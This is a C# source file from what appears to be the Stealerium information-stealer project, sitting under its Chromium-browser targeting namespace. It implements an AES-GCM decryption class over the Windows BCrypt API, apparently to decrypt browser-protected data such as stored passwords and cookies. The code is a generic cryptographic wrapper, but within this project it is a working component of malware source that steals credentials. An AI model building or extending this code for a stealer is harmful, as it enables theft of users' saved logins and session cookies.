using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Stealerium.Target.Browsers.Chromium
{
    internal class CAesGcm
    {
        public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
        {
            var hAlg = OpenAlgorithmProvider(CbCrypt.BCRYPT_AES_ALGORITHM, CbCrypt.MsPrimitiveProvider,
                CbCrypt.BCRYPT_CHAIN_MODE_GCM);
            var keyDataBuffer = ImportKey(hAlg, key, out var hKey);

            byte[] plainText;

            var authInfo = new CbCrypt.AuthenticatedCipherModeInfo(iv, aad, authTag);
            using (authInfo)
            {
                var ivData = new byte[MaxAuthTagSize(hAlg)];

                var plainTextSize = 0;

                var status = CbCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData,
                    ivData.Length, null, 0, ref plainTextSize, 0x0);

                if (status != CbCrypt.ErrorSuccess)
                    throw new CryptographicException(
                        $"BCrypt.BCryptDecrypt() (get size) failed with status code: {status}");

                plainText = new byte[plainTextSize];

                status = CbCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length,
                    plainText, plainText.Length, ref plainTextSize, 0x0);

                if (status == CbCrypt.StatusAuthTagMismatch)
                    throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");

                if (status != CbCrypt.ErrorSuccess)
                    throw new CryptographicException($"BCrypt.BCryptDecrypt() failed with status code:{status}");
            }

            CbCrypt.BCryptDestroyKey(hKey);
            Marshal.FreeHGlobal(keyDataBuffer);
            CbCrypt.BCryptCloseAlgorithmProvider(hAlg, 0x0);

            return plainText;
        }

        private static int MaxAuthTagSize(IntPtr hAlg)
        {
            var tagLengthsValue = GetProperty(hAlg, CbCrypt.BCRYPT_AUTH_TAG_LENGTH);

            return BitConverter.ToInt32(
                new[] {tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7]}, 0);
        }

        private static IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
        {
            var status = CbCrypt.BCryptOpenAlgorithmProvider(out var hAlg, alg, provider, 0x0);

            if (status != CbCrypt.ErrorSuccess)
                throw new CryptographicException(
                    $"BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{status}");

            var chainMode = Encoding.Unicode.GetBytes(chainingMode);
            status = CbCrypt.BCryptSetAlgorithmProperty(hAlg, CbCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length,
                0x0);

            if (status != CbCrypt.ErrorSuccess)
                throw new CryptographicException(
                    $"BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{status}");

            return hAlg;
        }

        private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
        {
            var objLength = GetProperty(hAlg, CbCrypt.BCRYPT_OBJECT_LENGTH);

            var keyDataSize = BitConverter.ToInt32(objLength, 0);

            var keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);

            var keyBlob = Concat(CbCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1),
                BitConverter.GetBytes(key.Length), key);

            var status = CbCrypt.BCryptImportKey(hAlg, IntPtr.Zero, CbCrypt.BCRYPT_KEY_DATA_BLOB, out hKey,
                keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);

            if (status != CbCrypt.ErrorSuccess)
                throw new CryptographicException($"BCrypt.BCryptImportKey() failed with status code:{status}");

            return keyDataBuffer;
        }

        private static byte[] GetProperty(IntPtr hAlg, string name)
        {
            var size = 0;

            var status = CbCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);

            if (status != CbCrypt.ErrorSuccess)
                throw new CryptographicException(
                    $"BCrypt.BCryptGetProperty() (get size) failed with status code:{status}");

            var value = new byte[size];

            status = CbCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);

            if (status != CbCrypt.ErrorSuccess)
                throw new CryptographicException($"BCrypt.BCryptGetProperty() failed with status code:{status}");

            return value;
        }

        public byte[] Concat(params byte[][] arrays)
        {
            var len = arrays.Where(array => array != null).Sum(array => array.Length);

            var result = new byte[len - 1 + 1];
            var offset = 0;

            foreach (var array in arrays)
            {
                if (array == null)
                    continue;
                Buffer.BlockCopy(array, 0, result, offset, array.Length);
                offset += array.Length;
            }

            return result;
        }
    }
}